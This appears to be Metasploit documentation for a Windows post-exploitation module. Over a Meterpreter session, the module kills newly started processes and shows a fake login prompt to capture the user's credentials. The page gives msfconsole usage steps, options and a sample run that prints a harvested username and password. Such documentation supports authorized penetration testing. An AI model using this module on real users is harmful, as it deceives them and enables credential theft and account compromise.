
## Vulnerable Application

  This module is able to perform a phishing attack on the target by
  popping up a login prompt. When the user fills credentials in the
  login prompt, the credentials will be sent to the attacker. The
  module is able to monitor for new processes and popup a login prompt
  when a specific process is starting. Tested on Windows 7.

## Verification Steps

  1. Start msfconsole
  2. Get meterpreter session
  3. Do: ```use post/windows/gather/phish_windows_credentials```
  4. Do: ```set SESSION <session id>```
  5. Do: ```run```

## Options

  **DESCRIPTION**

  Message shown in the loginprompt.

  **PROCESS**

  Prompt if a specific process is started by the target. (e.g. calc.exe or specify * for all processes.

  **SESSION**

  The session to run this module on.

## Scenarios

### Windows 7 (6.1 Build 7601, Service Pack 1).

  ```
  [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.10:49164) at 2019-12-17 11:47:06 -0700

  msf > use post/windows/gather/phish_windows_credentials
  msf post(windows/gather/phish_windows_credentials) > set SESSION 1
    SESSION => 1
  msf5 post(windows/gather/phish_windows_credentials) > set PROCESS *
    PROCESS => *
  msf5 post(windows/gather/phish_windows_credentials) > exploit

  [+] PowerShell is installed.
  [*] Monitoring new processes.
  [*] [System Process] is already running. Waiting on new instances to start
  [*] System is already running. Waiting on new instances to start
  ...snip...
  [*] New process detected: 2744 notepad.exe
  [*] Killing the process and starting the popup script. Waiting on the user to fill in his credentials...
  [+]

  [+] UserName                   Domain                     Password
  --------                   ------                     --------
  MY                         MY-PC                      P@ssw0rd1!



  [*] Post module execution completed
  ```
